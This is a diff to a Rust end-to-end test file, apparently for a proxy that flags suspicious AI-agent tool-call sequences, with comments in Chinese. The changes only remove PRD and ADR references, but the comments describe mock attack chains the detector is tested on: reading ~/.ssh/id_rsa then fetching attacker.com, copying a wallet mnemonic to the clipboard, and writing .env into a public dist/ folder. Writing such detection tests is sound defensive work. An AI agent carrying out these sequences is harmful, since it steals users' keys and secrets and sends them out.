@@ -1,4 +1,4 @@
-//! PRD §9 #16 行为序列 e2e 测试矩阵（PRD v2.0 Week 9）。
+//! 行为序列 e2e 测试矩阵。
 //!
 //! 覆盖：mock 攻击序列在 4 类 content-type 组合下都触发 IN-SEQ-*
 //!
@@ -16,10 +16,10 @@
 //! | seq07_clipboard_secret_{4 路由}     | both     | SSE+JSON         | Read(mnemonic)→pbcopy  | IN-SEQ-07 in stderr|
 //! | seq08_public_artifact_{4 路由}      | both     | SSE+JSON         | Read(.env)→Write(dist/)| IN-SEQ-08 in stderr|
 //!
-//! IN-SEQ-06（跨 agent）窗口每请求作用域 → live 路径不可达，仅 detector 单测覆盖（ADR-046 已知 gap）。
+//! IN-SEQ-06（跨 agent）窗口每请求作用域 → live 路径不可达，仅 detector 单测覆盖（已知 gap）。
 //!
 //! 关键：
-//! - IN-SEQ-* 不阻断响应（PRD §9 #15 硬约束），期望响应正常转发
+//! - IN-SEQ-* 不阻断响应（硬约束），期望响应正常转发
 //! - 通过 daemon stderr + RUST_LOG=sequence_alert=info 捕获 tracing event
 //! - 整个 mod 用 #[cfg(feature = "sequence_detection")] 包裹，feature OFF 时编译为空文件
 //! - 跑本测试：`cargo test -p sieve-cli --features sequence_detection --test sequence_window_e2e`
@@ -290,7 +290,7 @@ dry_run = false
             // 使用 info（不是 sequence_alert=info,warn）避免 env-filter 解析歧义。
             // tracing-subscriber 默认写 stdout（W = fn() -> io::Stdout），所以 pipe stdout。
             .env("SIEVE_LOG", "info")
-            // ADR-030: 测试禁止触发真实 updates.sieveai.dev 联网 + telemetry 上报
+            // 测试禁止触发真实 updates.sieveai.dev 联网 + telemetry 上报
             .env("SIEVE_NO_UPDATE", "1")
             .env("SIEVE_NO_TELEMETRY", "1")
             .env("SIEVE_HOME", sieve_home.path())
@@ -595,7 +595,7 @@ dry_run = false
 
     // ─── IN-SEQ-01 × 4 类组合测试 ─────────────────────────────────────────────
 
-    /// 组合 1：Anthropic + text/event-stream → IN-SEQ-01-RECON-EXFIL（PRD §5.7.2）。
+    /// 组合 1：Anthropic + text/event-stream → IN-SEQ-01-RECON-EXFIL。
     ///
     /// Read(~/.ssh/id_rsa) → WebFetch(attacker.com) 顺序触发。
     /// 期望：daemon stderr 含 IN-SEQ-01-RECON-EXFIL；响应无 sieve_blocked（不阻断）。
@@ -625,7 +625,7 @@ dry_run = false
         let body_str = String::from_utf8_lossy(&body);
         assert!(
             !body_str.contains("sieve_blocked"),
-            "IN-SEQ-01 不应阻断响应（PRD §9 #15）；body={body_str}"
+            "IN-SEQ-01 不应阻断响应；body={body_str}"
         );
 
         // 等 daemon 处理完，然后关闭收集 stderr
@@ -642,7 +642,7 @@ dry_run = false
 
     /// 组合 2：Anthropic + application/json（非流式）→ IN-SEQ-01-RECON-EXFIL。
     ///
-    /// 双路径不变量（PRD §5.7.4）：JSON 路径同样记录序列窗口。
+    /// 双路径不变量：JSON 路径同样记录序列窗口。
     #[tokio::test]
     async fn seq_anthropic_json_recon_exfil() {
         let json_body = anthropic_recon_exfil_json();
@@ -709,7 +709,7 @@ dry_run = false
         let body_str = String::from_utf8_lossy(&body);
         assert!(
             !body_str.contains("sieve_blocked"),
-            "IN-SEQ-01 不应阻断（PRD §9 #15）；body={body_str}"
+            "IN-SEQ-01 不应阻断；body={body_str}"
         );
 
         std::thread::sleep(Duration::from_millis(300));
@@ -925,12 +925,12 @@ dry_run = false
         );
     }
 
-    // ─── IN-SEQ-04~08 出站 exfil 链 × 4 路由矩阵（ADR-046 / ADR-025 验收）────────
+    // ─── IN-SEQ-04~08 出站 exfil 链 × 4 路由矩阵────────
     //
     // 通用 fixture builder：任意 tool 序列 → 四格式渲染（Anthropic SSE/JSON +
     // OpenAI SSE/JSON），覆盖「每条 IN-SEQ 四路由各一例」验收。
     // IN-SEQ-06（跨 agent）因序列窗口每请求重置、单响应单 actor，live 路径不可达
-    // （窗口作用域限制，见 ADR-046 已知 gap），故此处只覆盖 04/05/07/08；
+    // （窗口作用域限制，见已知 gap），故此处只覆盖 04/05/07/08；
     // 06 链逻辑由 sequence/detector.rs 单测守护。
 
     #[derive(Clone, Copy)]
